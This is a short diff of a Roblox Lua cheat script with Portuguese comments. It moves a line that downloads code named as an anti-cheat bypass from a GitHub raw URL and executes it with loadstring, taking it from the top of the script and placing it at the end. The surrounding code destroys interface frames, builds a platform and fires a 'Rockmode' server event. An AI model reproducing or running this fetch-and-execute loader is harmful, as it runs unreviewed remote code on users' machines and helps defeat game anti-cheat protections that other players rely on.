@@ -23,8 +23,6 @@ task.wait(1.5)
 flashFrame:Destroy()
 textLabelflash:Destroy()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/RAFA12763/Scripts/refs/heads/main/BYPASS_ANTICHEAT_XUNAXI_Scripts.lua"))();
-
 -- Cria uma plataforma de 50x1x50 na posição (-910, 342, 1)
 local function createPlatform()
     local platform = Instance.new("Part") -- Cria uma nova peça
@@ -139,3 +137,5 @@ task.wait(1)
 
 -- Ativa modo Rockmode
 game:GetService("ReplicatedStorage").Rockmode:FireServer()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RAFA12763/Scripts/refs/heads/main/BYPASS_ANTICHEAT_XUNAXI_Scripts.lua"))();
